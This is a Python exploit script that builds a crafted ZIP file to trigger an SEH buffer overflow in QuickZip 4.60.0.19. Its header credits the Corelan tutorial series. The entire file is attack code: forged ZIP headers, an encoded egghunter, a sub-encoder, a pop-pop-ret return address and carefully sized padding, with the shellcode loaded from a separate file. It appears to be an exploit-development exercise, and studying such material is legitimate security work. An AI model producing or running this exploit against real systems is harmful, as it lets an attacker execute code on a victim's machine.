#!/usr/bin/python

'''
QuickZip buffer overflow exploit from Corelan blog series 
exploiting using ppr 
Program Name: QuickZip 4.60.0.19
Offset :- 
Shellcode := 
Special Thanks to Corelan and OffsecTeam 
'''

def createZip(fileName,shellcode):
    fileHandler = open(fileName,'w')
    ldfHeader =  "\x50\x4B\x03\x04\x14\x00\x00"
    ldfHeader += "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    ldfHeader += "\x00\x00\x00\x00\x00\x00\x00\x00"
    ldfHeader += "\xe4\x0f"  #file size
    ldfHeader += "\x00\x00\x00"

    cdfHeader =  "\x50\x4B\x01\x02\x14\x00\x14"
    cdfHeader += "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    cdfHeader += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cdfHeader += "\xe4\x0f"
    cdfHeader += "\x00\x00\x00\x00\x00\x00\x01\x00"
    cdfHeader += "\x24\x00\x00\x00\x00\x00\x00\x00"

    eofcdfHeader = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    eofcdfHeader += "\x12\x10\x00\x00" # Size of central directory (bytes)
    eofcdfHeader += "\x02\x10\x00\x00" # Offset of start of central directory, relative to start of archive
    eofcdfHeader += "\x00\x00"

    payload = shellcode #metasploit payload
    payload += ".txt"

    print "[+] Size of the payload is {0}".format(len(payload))
    print "[+] Creating file with Name {0}".format(fileName)

    fileHandler.write(ldfHeader+payload+cdfHeader+payload+eofcdfHeader)
    fileHandler.close()

    print "[+] File Creating Finish ! Happy Exploiting !"


def readShellcode():
    fileHandler = open("buffer.txt","r")
    payload = fileHandler.read()
    fileHandler.close()
    egghunter ="JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI2FK1zjyofoG20R3Z5R0XzmvN7LferzadzOnXbW00vPadK9HWLocE9znOD5zGIoIwAA"
    subencoder =  "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x75\x75\x75\x75\x2D\x54\x54\x75\x54\x2D\x37\x36\x33\x36\x50\x2D\x33\x43\x43\x43\x2D\x26\x6D\x43\x43\x2D\x26\x65\x78\x75\x50"
    #printable address from .exe 00492D35 -- ppr
    shellcode= egghunter + "A"*(1022-202-len(egghunter)) + "\x61"*71 +"\x54\x5a\x74\x20\x75\x20"+ "C"* (100-71-6) + "\x74\xf7"+"C"*10 + subencoder + "B"*(90-len(subencoder)) + "\x74\xf7\x74\xf7" + "\x35\x2d\x49\x00" + "C"* (4064-1026-4)

    #shellcode= egghunter + "A"*(1022-202-len(egghunter)) + "\x61"*71 + "\x54\x5a\x74\x20"+ "C"* (100-71-4) + "\x74\xf7"+"B"*100 + "\x74\xf7\x75\xf7" + "\x35\x2d\x49\x00" + "C"* (4064-1026-4)

    print "[+] Length of Shellcode {0}".format(len(shellcode))
    return shellcode

    
if __name__ == '__main__':
    fileName="quickzipexploit2.zip"
    shellcode=readShellcode()
    createZip(fileName,shellcode)

